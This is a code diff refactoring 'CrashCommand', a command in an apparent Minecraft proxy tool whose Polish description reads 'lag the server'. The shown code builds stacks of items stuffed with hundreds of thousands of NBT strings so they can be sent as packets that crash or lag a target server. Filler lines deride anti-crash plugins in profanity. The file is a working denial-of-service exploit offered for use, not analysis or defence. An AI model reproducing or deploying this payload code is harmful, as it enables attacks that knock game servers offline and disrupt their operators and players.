@@ -13,8 +13,8 @@ import org.spacehq.mc.protocol.packet.ingame.client.window.ClientWindowActionPac
 import org.spacehq.opennbt.tag.builtin.*;
 import org.spacehq.packetlib.packet.Packet;
 import xyz.yooniks.cproxy.command.Command;
-import xyz.yooniks.cproxy.enums.CrashType;
-import xyz.yooniks.cproxy.enums.Group;
+import xyz.yooniks.cproxy.types.CrashType;
+import xyz.yooniks.cproxy.Group;
 import xyz.yooniks.cproxy.objects.Bot;
 import xyz.yooniks.cproxy.objects.Player;
 
@@ -23,35 +23,29 @@ import java.util.List;
 
 public class CrashCommand extends Command {
 
-    private static CrashCommand instance;
     private ItemStack isBeacon;
     private ItemStack isBook;
     private ItemStack isByte;
     public CrashCommand() {
         super("crash", "Zlaguj serwer!", ",crash [ilosc pakietow] [boty/gracz-true/false] [infinite-true/false] [odstep w sek] &a[&atype&a (swingarm,windowclick,blockplace,setcreativeslot,helditem) [item: beacon/book/byte] ",
                 Group.GRACZ, "krasz", "lag");
-        instance = this;
-        //if (true) {
+
         final CompoundTag nbtB = new CompoundTag("display");
         final List<Tag> tagsB = new ArrayList<>();
-        //for (int i = 0; i < 400000; i++)
         for (int i = 0; i < 500000; i++)
             tagsB.add(new StringTag("-________- jebac xprotector"));
         final ListTag listTagB = new ListTag("Lore", tagsB);
         isBeacon = new ItemStack(137, 64, 0, nbtB);
         isBeacon.getNBT().put(listTagB);
-        // }
 
-        //if (true) {
-        final CompoundTag nbt2 = new CompoundTag("ench");
+        final CompoundTag nbt2 = new CompoundTag(""); //usunieto 'ench'
         final List<Tag> tags2 = new ArrayList<>();
         for (int i = 0; i < 10000; i++)
             tags2.add(new StringTag("-________- jebac antycrasherki"));
         final ListTag listTag2 = new ListTag("pages", tags2);
         isBook = new ItemStack(386, 64, 0, nbt2);
         isBook.getNBT().put(listTag2);
-        //}
-        //if (true){
+
         final CompoundTag nbt = new CompoundTag("ench");
         final List<Tag> tags = new ArrayList<>();
         for (int i = 0; i < 20000; i++)
@@ -59,11 +53,6 @@ public class CrashCommand extends Command {
         final ListTag listTag = new ListTag("END", tags);
         isByte = new ItemStack(386, 64, 0, nbt);
         isByte.getNBT().put(listTag);
-        //}
-    }
-
-    public static CrashCommand getInstance() {
-        return instance;
     }
 
     @Override
